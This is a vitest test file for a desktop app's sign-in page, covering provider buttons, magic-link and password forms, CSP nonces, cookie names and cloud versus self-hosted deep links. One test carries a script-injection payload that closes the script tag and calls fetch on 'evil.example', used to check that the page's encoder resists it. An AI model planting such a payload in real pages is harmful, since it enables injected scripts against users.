import { describe, expect, it } from 'vitest';
import { DESKTOP_AUTH_CLIENT_ID, desktopAuthDeepLink } from '@crewaid/shared';
import { renderDesktopSignInPage } from '../src/auth/desktop-sign-in-page.js';

/**
 * V1-11 — what the sign-in page tells the browser.
 *
 * The page's BEHAVIOUR is JavaScript and this workspace has no DOM to run it
 * in, which sounds like a gap and is mostly a consequence: every decision that
 * could be got wrong was deliberately pushed server-side to `/electron/token`,
 * where `desktop-sign-in.integration.test.ts` holds it. What is left here is
 * the markup — and the two things about markup that do bite.
 *
 * The first is offering a button that cannot work. An install with no GitHub
 * credentials must not render a GitHub button: pressing it starts a redirect
 * that ends in a 500 on the orchestrator, and the person reading that error is
 * looking at GitHub's console by then.
 *
 * The second is the script tag. This page carries server-side values into
 * JavaScript, which is the shape every injected-script bug has ever had.
 */

const NONCE = 'test-nonce-0123456789';
const BASE = '/api/v1/auth';

/** A hosted server's page options, before the providers each case varies. */
const CLOUD = { password: false, deepLink: desktopAuthDeepLink('cloud') } as const;
/** A self-hosted server's: password only, no providers, no mail (D-152). */
const SELF_HOSTED = {
  providers: [],
  magicLink: false,
  password: true,
  deepLink: desktopAuthDeepLink('selfhosted'),
} as const;

function config(html: string): Record<string, unknown> {
  const match = /<script type="application\/json" id="cfg">([\s\S]*?)<\/script>/.exec(html);
  expect(match, 'no config block in the page').not.toBeNull();
  // Decoding with the same escape the page writes, so a test cannot pass by
  // reading something a browser would not.
  return JSON.parse((match?.[1] ?? '').replace(/\\u003c/g, '<')) as Record<string, unknown>;
}

describe('V1-11 — the desktop sign-in page', () => {
  it('offers only the providers the orchestrator is configured for', () => {
    const html = renderDesktopSignInPage(
      { ...CLOUD, providers: ['google'], magicLink: false },
      BASE,
      NONCE,
    );

    expect(html).toContain('Continue with Google');
    expect(html).not.toContain('Continue with GitHub');
    expect(config(html)['providers']).toEqual([
      { id: 'google', label: 'Continue with Google', short: 'Google' },
    ]);
  });

  it('keeps a full sentence as each provider button’s accessible name', () => {
    // The button reads "Google" beside the mark, because two buttons side by
    // side in a 400px card cannot hold "Continue with Google" on one line. The
    // accessible name still has to say what pressing it does — "Google",
    // announced alone, is a noun rather than an action.
    const providers = config(
      renderDesktopSignInPage(
        { ...CLOUD, providers: ['google', 'github'], magicLink: false },
        BASE,
        NONCE,
      ),
    )['providers'] as ReadonlyArray<{ label: string; short: string }>;

    for (const provider of providers) {
      expect(provider.short.length).toBeLessThan(provider.label.length);
      expect(provider.label).toMatch(/^Continue with /);
    }
  });

  it('starts on sign-IN, with no name field, and offers the way across', () => {
    // Signing in and signing up are the same request — a magic link to an
    // unknown address creates the account — so the split is presentational,
    // and it earns its place by removing a box. A returning person already has
    // a name on their account, and asking for it again implies it is being
    // changed.
    const html = renderDesktopSignInPage({ ...CLOUD, providers: [], magicLink: true }, BASE, NONCE);

    expect(html).toContain('<div id="name-field" hidden>');
    expect(html).toContain('id="mode-toggle"');
    expect(html).toContain('Create an account');
  });

  it('asks for a name alongside the email, which is what magic-link sign-UP needs', () => {
    // Better Auth's magic-link endpoint takes an optional `name`, used only
    // when the address has no account yet. Omitting the field meant every
    // magic-link sign-up created a User row with no name — which the desktop
    // sidebar then had to render, and did, as a bare email address.
    const html = renderDesktopSignInPage({ ...CLOUD, providers: [], magicLink: true }, BASE, NONCE);

    // Present in the markup, revealed by the sign-up toggle — the field has to
    // exist for the toggle to have something to show.
    expect(html).toContain('id="name"');
    expect(html).toContain('id="email"');
    // Asserted against a presence: the email field above is required and the
    // name field must NOT be, or a returning person is blocked by a box that
    // does nothing for them.
    expect(/<input id="email"[^>]*\brequired\b/.test(html)).toBe(true);
    expect(/<input id="name"[^>]*\brequired\b/.test(html)).toBe(false);
  });

  it('never asks for a password, because nothing here accepts one', () => {
    // V1-08 made a Better Auth session the only credential; there is no
    // password grant on this orchestrator. A password box would be a field
    // that collects a secret nothing can check.
    const html = renderDesktopSignInPage(
      { ...CLOUD, providers: ['google'], magicLink: true },
      BASE,
      NONCE,
    );
    expect(html).not.toContain('type="password"');
    expect(html.toLowerCase()).not.toContain('password');
  });

  it('hides the email form when magic links are not configured', () => {
    const configured = renderDesktopSignInPage(
      { ...CLOUD, providers: [], magicLink: true },
      BASE,
      NONCE,
    );
    const not = renderDesktopSignInPage({ ...CLOUD, providers: [], magicLink: false }, BASE, NONCE);

    expect(config(configured)['magicLink']).toBe(true);
    expect(config(not)['magicLink']).toBe(false);
  });

  it('says so when there is no way in at all', () => {
    // An orchestrator booted with none of the three configured is a real
    // state — `socialProvider()` omits a provider rather than half-registering
    // it — and the page is where a person finds out. A blank card would read
    // as a broken page rather than as a missing environment variable.
    const html = renderDesktopSignInPage(
      { ...CLOUD, providers: [], magicLink: false },
      BASE,
      NONCE,
    );

    expect(html).toContain('No sign-in method is configured');
    expect(html).toContain('GOOGLE_CLIENT_ID');
  });

  it('cannot be made to close its own script element', () => {
    // The page is the last hop before a credential. Today every value in that
    // block comes from server configuration, so this is a property of the
    // ENCODER rather than a live hole — which is exactly when to pin it, while
    // the answer is still cheap.
    const hostile = '</script><script>fetch("https://evil.example")</script>';
    const html = renderDesktopSignInPage(
      { ...CLOUD, providers: [], magicLink: false },
      hostile,
      NONCE,
    );

    // One script element for the config, one for the page's own code, and no
    // third one smuggled in through a value.
    expect(html.split('<script').length - 1).toBe(2);
    expect(html).not.toContain(hostile);
    expect(config(html)['basePath']).toBe(hostile);
  });

  it('binds its inline script and style to the nonce it was given', () => {
    // The CSP the endpoint sends names this nonce and nothing else, so a
    // script that lost its attribute does not run — and the page fails as a
    // dead button rather than as anything a user could diagnose.
    const html = renderDesktopSignInPage(
      { ...CLOUD, providers: ['github'], magicLink: true },
      BASE,
      NONCE,
    );

    expect(html).toContain(`<script nonce="${NONCE}">`);
    expect(html).toContain(`<style nonce="${NONCE}">`);
  });

  it('sends the browser back over the contract both sides read', () => {
    // The deep link and the client id live in `@crewaid/shared` because Electron
    // validates the callback against its own copy. If these stop matching, the
    // callback is refused unread and the app looks like it did nothing.
    const html = renderDesktopSignInPage(
      { ...CLOUD, providers: ['google'], magicLink: true },
      BASE,
      NONCE,
    );
    const parsed = config(html);

    expect(parsed['deepLink']).toBe(desktopAuthDeepLink('cloud'));
    expect(parsed['clientId']).toBe(DESKTOP_AUTH_CLIENT_ID);
    expect(parsed['cookieName']).toBe(`better-auth.${DESKTOP_AUTH_CLIENT_ID}`);
  });

  it('reads the cookie prefix it is GIVEN, not the one it would have guessed', () => {
    // `electron()` names the cookie `<cookiePrefix>.<clientID>` and this page
    // has to look for that exact name. Both sides default to 'better-auth'
    // independently, so the assertion above passes just as well for a page
    // that ignores the option entirely and hardcodes the default — and the
    // failure that hides is silent: the page polls for a cookie that is never
    // set, and sign-in hangs with no error on either side.
    //
    // `better-auth.ts` now passes one constant to both. This is the fence that
    // the page actually honours it.
    const parsed = config(
      renderDesktopSignInPage(
        { ...CLOUD, providers: [], magicLink: true, cookiePrefix: 'crewaid-auth' },
        BASE,
        NONCE,
      ),
    );

    expect(parsed['cookieName']).toBe(`crewaid-auth.${DESKTOP_AUTH_CLIENT_ID}`);
  });
});

describe('D-152 — the self-hosted sign-in page', () => {
  it('offers email and password, and nothing that needs a provider or mail', () => {
    const html = renderDesktopSignInPage(SELF_HOSTED, BASE, NONCE);
    const parsed = config(html);

    expect(html).toContain('id="password-form"');
    expect(html).toContain('type="password"');
    expect(html).toContain("'/sign-up/email'");
    expect(html).toContain("'/sign-in/email'");
    expect(parsed['providers']).toEqual([]);
    expect(parsed['magicLink']).toBe(false);
  });

  it('is not told it has no way in', () => {
    // The hosted page's "nothing is configured" message names Google and
    // Resend; on a self-hosted server it would send the operator to set up
    // services this edition deliberately does without.
    const html = renderDesktopSignInPage(SELF_HOSTED, BASE, NONCE);
    expect(html).not.toContain('No sign-in method is configured');
  });

  it('hands the code back to the self-hosted app, not the cloud one', () => {
    // Both apps can be installed side by side. The cloud app holds no verifier
    // for this sign-in, so a code bounced to its scheme is a sign-in that
    // silently never completes.
    const parsed = config(renderDesktopSignInPage(SELF_HOSTED, BASE, NONCE));
    expect(parsed['deepLink']).toBe(desktopAuthDeepLink('selfhosted'));
    expect(parsed['deepLink']).not.toBe(desktopAuthDeepLink('cloud'));
  });

  it('keeps the hosted page free of any password field or the code that posts one', () => {
    // Rendered, not hidden: the property is about the bytes the browser gets.
    const hosted = renderDesktopSignInPage(
      { ...CLOUD, providers: ['google'], magicLink: true },
      BASE,
      NONCE,
    );
    expect(hosted).not.toContain('password-form');
    expect(hosted).not.toContain('/sign-up/email');
  });
});
